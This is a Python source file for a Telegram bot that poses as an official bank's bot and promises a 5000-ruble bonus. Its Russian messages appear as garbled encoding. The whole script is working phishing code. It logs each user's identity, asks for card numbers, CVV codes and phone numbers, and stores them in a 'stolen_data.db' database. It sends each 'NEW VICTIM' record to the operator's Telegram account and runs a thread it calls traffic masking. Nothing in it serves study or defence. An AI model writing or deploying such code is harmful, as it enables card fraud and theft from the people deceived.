import telebot
import sqlite3
import threading
import time
from telebot import types

TOKEN = "TOKEN"
ADMIN_ID = "YOUID"
DB_NAME = "stolen_data.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     user_id INTEGER,
                     username TEXT,
                     first_name TEXT,
                     last_name TEXT,
                     phone TEXT,
                     card TEXT,
                     timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

bot = telebot.TeleBot(TOKEN)

def save_stolen_data(user_id, username, first_name, last_name, phone=None, card=None):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO users (user_id, username, first_name, last_name, phone, card) VALUES (?, ?, ?, ?, ?, ?)",
        (user_id, username, first_name, last_name, phone, card))
    conn.commit()
    conn.close()
    bot.send_message(ADMIN_ID,
                     f"‚ö†Ô∏è NEW VICTIM ‚ö†Ô∏è\nID: {user_id}\nUser: @{username}\nName: {first_name} {last_name}\nPhone: {phone}\nCard: {card}")

@bot.message_handler(commands=['start'])
def start_phishing(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("üéÅ –ü–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å")
    btn2 = types.KeyboardButton("üìû –ü–æ–¥–¥–µ—Ä–∂–∫–∞")
    markup.add(btn1, btn2)

    bot.send_message(message.chat.id,
                     "üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –±–æ—Ç –§–∏–¥–µ—Å –ë–∞–Ω–∫!\n\n"
                     "–ú—ã –¥–∞—Ä–∏–º *5000‚ÇΩ* –Ω–æ–≤—ã–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º! –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è.",
                     parse_mode='Markdown', reply_markup=markup)
    save_stolen_data(message.from_user.id, message.from_user.username,
                     message.from_user.first_name, message.from_user.last_name)

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    if message.text == "üéÅ –ü–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å":
        msg = bot.send_message(message.chat.id,
                               "–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–Ω—É—Å–∞ –Ω–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –≤–∞—à—É –∫–∞—Ä—Ç—É.\n\n"
                               "‚ö†Ô∏è –í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã (16 —Ü–∏—Ñ—Ä):")
        bot.register_next_step_handler(msg, process_card_step)
    elif message.text == "üìû –ü–æ–¥–¥–µ—Ä–∂–∫–∞":
        msg = bot.send_message(message.chat.id,
                               "–ù–∞—à –æ–ø–µ—Ä–∞—Ç–æ—Ä —Å–≤—è–∂–µ—Ç—Å—è —Å –≤–∞–º–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 5 –º–∏–Ω—É—Ç.\n\n"
                               "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (+7XXXXXXXXXX):")
        bot.register_next_step_handler(msg, process_phone_step)

def process_card_step(message):
    try:
        card = message.text.replace(" ", "")
        if len(card) == 16 and card.isdigit():
            save_stolen_data(message.from_user.id, message.from_user.username,
                             message.from_user.first_name, message.from_user.last_name,
                             card=card)
            bot.send_message(message.chat.id,
                             "‚úÖ –ö–∞—Ä—Ç–∞ –ø—Ä–∏–Ω—è—Ç–∞! –û–∂–∏–¥–∞–π—Ç–µ –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.\n\n"
                             "–î–ª—è —É—Å–∫–æ—Ä–µ–Ω–∏—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –≤–≤–µ–¥–∏—Ç–µ CVV –∫–æ–¥:")
            bot.register_next_step_handler(message, process_cvv_step)
        else:
            bot.send_message(message.chat.id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–∞—Ä—Ç—ã! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
            bot.register_next_step_handler(message, process_card_step)
    except Exception as e:
        bot.send_message(ADMIN_ID, f"ERROR: {str(e)}")

def process_cvv_step(message):
    cvv = message.text
    if len(cvv) == 3 and cvv.isdigit():
        bot.send_message(message.chat.id,
                         "üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í–∞—à –±–æ–Ω—É—Å –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.")
        bot.send_message(ADMIN_ID, f"üö® FULL CARD DATA üö®\nUser: @{message.from_user.username}\nCard: {card}\nCVV: {cvv}")
    else:
        bot.send_message(message.chat.id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π CVV! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        bot.register_next_step_handler(message, process_cvv_step)

def process_phone_step(message):
    phone = message.text
    if phone.startswith('+7') and len(phone) == 12:
        save_stolen_data(message.from_user.id, message.from_user.username,
                         message.from_user.first_name, message.from_user.last_name,
                         phone=phone)
        bot.send_message(message.chat.id,
                         "‚úÖ –í–∞—à –∑–∞–ø—Ä–æ—Å –ø—Ä–∏–Ω—è—Ç! –û–∂–∏–¥–∞–π—Ç–µ –∑–≤–æ–Ω–∫–∞ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞.")
    else:
        bot.send_message(message.chat.id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ç–µ–ª–µ—Ñ–æ–Ω–∞! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ +7XXXXXXXXXX")
        bot.register_next_step_handler(message, process_phone_step)

def hide_traffic():
    while True:
        time.sleep(3600)
        bot.send_message(ADMIN_ID, "ü§ñ –ë–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç —Å—Ç–∞–±–∏–ª—å–Ω–æ, —Ç—Ä–∞—Ñ–∏–∫ –º–∞—Å–∫–∏—Ä—É–µ—Ç—Å—è")

if __name__ == "__main__":
    init_db()
    threading.Thread(target=hide_traffic, daemon=True).start()
    bot.polling(none_stop=True)
